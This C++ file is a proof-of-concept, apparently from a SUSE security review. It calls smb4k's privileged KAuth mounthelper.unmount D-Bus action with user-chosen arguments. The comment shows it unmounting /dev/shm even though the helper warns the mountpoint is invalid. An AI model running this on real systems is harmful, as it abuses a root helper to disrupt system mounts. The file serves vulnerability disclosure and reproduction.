#include <iostream>
#include <KAuth/ExecuteJob>
#include <QFileInfo>
#include <QApplicationStatic>

/*
 * Matthias Gerstner <matthias.gerstner@suse.de>
 *
 * 2025-12-01
 *
 * Overview
 * ========
 *
 * Helper for reproducing smb4k security issues. This utility invokes the
 * mounthelper.unmount D-Bus method, providing the arguments provided on the
 * command line.The action will only work when invoked from an active local
 * user session e.g. in a regular graphical session.
 *
 * Examples
 * ========
 *
 * This example shows how to unmount /dev/shm. The helper will output an error
 * message but still continue operating and unmounting. Unmounting only works
 * for non-busy file systems.
 *
 * $ mount | grep /dev/shm | wc -l
 * 1
 * $ ./smb4k_unmount /dev/shm
 * Warning from helper: "The mountpoint %1 is invalid." ...
 * unmounted!
 * $ mount | grep /dev/shm | wc -l
 * 0
 *
 * Compilation
 * ===========
 *
 * Compiling this standalone on openSUSE Tumbleweed requires a couple of
 * tweaks as shown below. For KF6 there exist not package config files, thus
 * switches need to be hard-coded here.
 *
 * ```
 * # install the smb4k package (not in Factory, only in KDE:Extra/smb4k)
 * $ zypper in /path/to/smb4k-4-0*.rpm
 * # install devel files for Qt and KAuth
 * zypper in kf6-kauth-devel qt6-core-devel
 *
 * g++ -std=c++17 smb4k_unmount.cpp -osmb4k_unmount \
 *  `pkg-config --cflags --libs Qt6Core` \
 *  -isystem /usr/include/KF6/KConfigCore -isystem /usr/include/KF6/KAuthCore \
 *  -isystem /usr/include/KF6/KCoreAddons -isystem /usr/include/KF6/KAuth \
 *  /usr/lib64/libKF6AuthCore.so.6.20.0 /usr/lib64/libKF6CoreAddons.so.6
 * ```
 */

int main(int argc, char **argv) {
	if (argc < 2) {
		std::cerr << argv[0] << " <mountpoint> <options...>\n";
		return 1;
	}

	QCoreApplication app(argc, argv);
        QVariantMap args;

	args.insert(QStringLiteral("mh_command"), QStringLiteral("/bin/umount"));
	args.insert(QStringLiteral("mh_mountpoint"), QString::fromStdString(argv[1]));

	QStringList options;
	for (int arg=2; arg < argc; arg++) {
		options << QString::fromStdString(argv[arg]);
	}
	args.insert(QStringLiteral("mh_options"), options);

        //
        // Create the unmount action
        //
        KAuth::Action unmountAction(QStringLiteral("org.kde.smb4k.mounthelper.unmount"));
        unmountAction.setHelperId(QStringLiteral("org.kde.smb4k.mounthelper"));
        unmountAction.setArguments(args);

        KAuth::ExecuteJob *job = unmountAction.execute();
        bool success = job->exec();
        if (success) {
            int errorCode = job->error();

            if (errorCode == 0) {
                // Get the error message
                QString errorMsg = job->data().value(QStringLiteral("mh_error_message")).toString();

                if (!errorMsg.isEmpty()) {
                    // No error handling needed, just report the error message.
			std::cerr << "unmounting failed: " << errorMsg.toStdString() << "\n";
			return 1;
                }
            } else {
		std::cerr << "unmounting failed with code " << errorCode << " (no error msg)\n";
		return 1;
            }
        } else {
		std::cerr << "action could not be started\n";
		return 1;
        }

	std::cout << "umounted!\n";
	return 0;
}
